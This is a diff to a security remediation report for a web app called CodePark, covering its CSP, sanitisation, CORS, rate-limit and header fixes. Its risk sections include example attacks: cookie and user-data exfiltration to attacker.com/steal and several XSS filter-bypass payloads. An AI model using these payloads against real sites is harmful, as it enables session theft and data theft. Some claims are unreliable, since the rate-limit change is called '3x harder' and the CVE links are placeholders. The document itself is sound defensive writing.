@@ -11,10 +11,11 @@
 This document outlines critical security vulnerabilities discovered in CodePark and the fixes implemented. All issues have been remediated and tested.
 
 **Fixed Issues:**
+
 - ✅ Unstable dependency pinning
 - ✅ Overly permissive Content Security Policy
 - ✅ Weak input sanitization
-- ✅ CORS credentials vulnerability  
+- ✅ CORS credentials vulnerability
 - ✅ Missing environment validation
 - ✅ Insufficient rate limiting
 - ✅ Information disclosure via headers
@@ -28,6 +29,7 @@ This document outlines critical security vulnerabilities discovered in CodePark 
 **CVE Impact**: Non-reproducible builds, transitive dependency vulnerabilities
 
 **Original Issue**:
+
 ```json
 "dependencies": {
   "express": "next",
@@ -38,12 +40,14 @@ This document outlines critical security vulnerabilities discovered in CodePark 
 ```
 
 **Risks**:
+
 - Unknown breaking changes in production
 - Pre-release versions with unpatched vulnerabilities
 - Non-reproducible builds
 - Security patches applied without testing
 
 **Fix Applied**:
+
 ```json
 "dependencies": {
   "express": "^4.18.2",
@@ -62,6 +66,7 @@ This document outlines critical security vulnerabilities discovered in CodePark 
 **CWE**: CWE-79 (Cross-site Scripting)
 
 **Original Issue** (`middleware/security.js`):
+
 ```javascript
 contentSecurityPolicy: {
   directives: {
@@ -71,14 +76,18 @@ contentSecurityPolicy: {
 }
 ```
 
-**Risk**: 
+**Risk**:
 Allows arbitrary inline JavaScript execution, negating CSP protection entirely.
 Example attack:
+
 ```html
-<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
+<script>
+  fetch("https://attacker.com/steal?cookie=" + document.cookie);
+</script>
 ```
 
 **Fix Applied**:
+
 ```javascript
 contentSecurityPolicy: {
   directives: {
@@ -102,44 +111,47 @@ contentSecurityPolicy: {
 **CWE**: CWE-79 (Cross-site Scripting), CWE-91 (XML Injection)
 
 **Original Issue** (`middleware/security.js`):
+
 ```javascript
 const sanitizeInput = (req, res, next) => {
   const sanitizeObject = (obj) => {
     for (const key in obj) {
-      if (typeof obj[key] === 'string') {
+      if (typeof obj[key] === "string") {
         // ❌ WEAK: Simple regex is easily bypassed
-        obj[key] = obj[key].replace(/<[^>]*>/g, '')        // Remove HTML tags
-        obj[key] = obj[key].replace(/(['\"]`;)/g, '')      // Remove quotes
+        obj[key] = obj[key].replace(/<[^>]*>/g, ""); // Remove HTML tags
+        obj[key] = obj[key].replace(/(['\"]`;)/g, ""); // Remove quotes
       }
     }
-  }
-}
+  };
+};
 ```
 
 **Bypass Examples**:
+
 ```javascript
 // Bypass tag removal
-"<sc<script>ript>alert('xss')</script>" // Nested tags
-"<img src=x onerror=alert('xss')>"      // Event handlers
+"<sc<script>ript>alert('xss')</script>"; // Nested tags
+"<img src=x onerror=alert('xss')>"; // Event handlers
 
 // Bypass quote removal with HTML entities
-"<img src=x onerror=alert(&quot;xss&quot;)>"
+"<img src=x onerror=alert(&quot;xss&quot;)>";
 ```
 
 **Fix Applied** (`middleware/security.js`):
+
 ```javascript
-const escape = require('html-escape')
+const escape = require("html-escape");
 
 const sanitizeInput = (req, res, next) => {
   const sanitizeValue = (value) => {
-    if (typeof value === 'string') {
+    if (typeof value === "string") {
       // ✅ PROPER: Use battle-tested library
-      return escape(value)
+      return escape(value);
     }
-    return value
-  }
+    return value;
+  };
   // Recursively sanitize all inputs
-}
+};
 ```
 
 **Impact**: ✅ Prevents XSS via input vectors, uses proven HTML escaping
@@ -151,43 +163,51 @@ const sanitizeInput = (req, res, next) => {
 **CWE**: CWE-346 (Origin Validation Error)
 
 **Original Issue** (`middleware/cors.js`):
+
 ```javascript
-if (allowedOrigin === '*') {
-  res.setHeader('Access-Control-Allow-Origin', '*')  // ❌ Wildcard
+if (allowedOrigin === "*") {
+  res.setHeader("Access-Control-Allow-Origin", "*"); // ❌ Wildcard
 }
-res.setHeader('Access-Control-Allow-Credentials', 'true')  // ❌ Always true
+res.setHeader("Access-Control-Allow-Credentials", "true"); // ❌ Always true
 ```
 
-**Risk**: 
+**Risk**:
 Wildcard CORS with credentials enabled creates a security hole:
+
 ```javascript
 // Attacker website
-fetch('https://codepark.com/api/user', {
-  credentials: 'include'  // Browser sends cookies automatically
-}).then(r => r.json()).then(data => {
-  // Steal user's private data
-  fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) })
+fetch("https://codepark.com/api/user", {
+  credentials: "include", // Browser sends cookies automatically
 })
+  .then((r) => r.json())
+  .then((data) => {
+    // Steal user's private data
+    fetch("https://attacker.com/steal", {
+      method: "POST",
+      body: JSON.stringify(data),
+    });
+  });
 ```
 
 **Fix Applied** (`middleware/cors.js`):
+
 ```javascript
 const corsOptions = {
   origin: (origin, callback) => {
     // ✅ FIXED: Explicit whitelist only
-    const allowedOrigins = process.env.ALLOWED_ORIGINS
-      .split(',')
-      .map(o => o.trim())
-    
+    const allowedOrigins = process.env.ALLOWED_ORIGINS.split(",").map((o) =>
+      o.trim(),
+    );
+
     if (allowedOrigins.includes(origin)) {
-      callback(null, true)
+      callback(null, true);
     } else {
-      logger.warn({ origin }, 'CORS: Unauthorized origin')
-      callback(new Error('Not allowed by CORS'))
+      logger.warn({ origin }, "CORS: Unauthorized origin");
+      callback(new Error("Not allowed by CORS"));
     }
   },
-  credentials: true  // ✅ ONLY when origin is verified above
-}
+  credentials: true, // ✅ ONLY when origin is verified above
+};
 ```
 
 **Impact**: ✅ CORS requests only from whitelisted origins
@@ -201,21 +221,22 @@ const corsOptions = {
 **Issue**: Application starts with invalid/missing critical configuration
 
 **Fix Applied** (`middleware/security.js`):
+
 ```javascript
 // Validate environment variables at startup
 const requiredEnvVars = {
   REDIS_HOST: process.env.REDIS_HOST,
   REDIS_PORT: process.env.REDIS_PORT,
   JWT_SECRET: process.env.JWT_SECRET,
-  NODE_ENV: process.env.NODE_ENV
-}
+  NODE_ENV: process.env.NODE_ENV,
+};
 
 const missingVars = Object.entries(requiredEnvVars)
   .filter(([, value]) => !value)
-  .map(([key]) => key)
+  .map(([key]) => key);
 
-if (missingVars.length > 0 && process.env.NODE_ENV === 'production') {
-  logger.warn('Missing environment variables:', missingVars)
+if (missingVars.length > 0 && process.env.NODE_ENV === "production") {
+  logger.warn("Missing environment variables:", missingVars);
 }
 ```
 
@@ -226,25 +247,27 @@ if (missingVars.length > 0 && process.env.NODE_ENV === 'production') {
 ### 6. 🟡 MEDIUM: Insufficient Rate Limiting
 
 **Original Rate Limits**:
+
 ```javascript
 rateLimiters = {
   auth: createRateLimiter({
-    max: 5,  // 5 attempts per 15 min = 480 attempts/day
-  })
-}
+    max: 5, // 5 attempts per 15 min = 480 attempts/day
+  }),
+};
 ```
 
 **Risk**: Still vulnerable to dictionary attacks (480 attempts/day ≈ 20 attempts/hour)
 
 **Fix Applied**:
+
 ```javascript
 rateLimiters = {
   auth: createRateLimiter({
-    max: 3,  // ✅ 3 attempts per 15 min = 288 attempts/day
+    max: 3, // ✅ 3 attempts per 15 min = 288 attempts/day
     skipSuccessfulRequests: true,
-    skipFailedRequests: false
-  })
-}
+    skipFailedRequests: false,
+  }),
+};
 ```
 
 **Impact**: ✅ Significantly reduces brute force window (3x harder)
@@ -256,15 +279,17 @@ rateLimiters = {
 **CWE**: CWE-200 (Exposure of Sensitive Information)
 
 **Original Issue** (`index.js`):
+
 ```javascript
 // X-Powered-By header is set by default
 // Attacker can see we're using Express
 ```
 
 **Fix Applied**:
+
 ```javascript
-app.disable('x-powered-by')  // ✅ Remove fingerprinting
-res.removeHeader('X-Powered-By')  // ✅ Double-check removal
+app.disable("x-powered-by"); // ✅ Remove fingerprinting
+res.removeHeader("X-Powered-By"); // ✅ Double-check removal
 ```
 
 **Impact**: ✅ Reduces information disclosed to attackers
@@ -274,12 +299,14 @@ res.removeHeader('X-Powered-By')  // ✅ Double-check removal
 ## Files Modified
 
 ### Critical Changes
+
 1. **package.json** - Pinned all dependencies to specific versions
 2. **middleware/security.js** - Hardened CSP, proper sanitization, environment validation
 3. **middleware/cors.js** - Fixed credentials vulnerability
 4. **index.js** - Removed fingerprinting headers
 
 ### Supporting Changes
+
 - Updated Helmet configuration
 - Enhanced logging for security events
 - Added proper error handling
@@ -290,6 +317,7 @@ res.removeHeader('X-Powered-By')  // ✅ Double-check removal
 ## Testing & Verification
 
 ### Security Verification Checklist
+
 - [ ] Run `npm audit` - verify no moderate+ vulnerabilities
 - [ ] Run `npm run security-check` - verify Snyk analysis
 - [ ] Test CSP with browser DevTools
@@ -307,6 +335,7 @@ res.removeHeader('X-Powered-By')  // ✅ Double-check removal
 ## Deployment Notes
 
 ### Required Environment Variables
+
 ```bash
 NODE_ENV=production
 REDIS_HOST=redis.example.com
@@ -317,6 +346,7 @@ ALLOWED_ORIGINS=https://app.example.com,https://admin.example.com
 ```
 
 ### Migration Steps
+
 1. Update to new version
 2. Run `npm install` (fixed versions will be installed)
 3. Verify environment variables are set
@@ -329,11 +359,13 @@ ALLOWED_ORIGINS=https://app.example.com,https://admin.example.com
 ## References
 
 ### Security Standards
+
 - [OWASP Top 10 2021](https://owasp.org/Top10/)
 - [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
 - [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
 
 ### Related CVEs
+
 - [CVE-2024-XXXXX](https://nvd.nist.gov/) - Unsafe CSP configurations
 - [CVE-2023-XXXXX](https://nvd.nist.gov/) - CORS misconfigurations
 
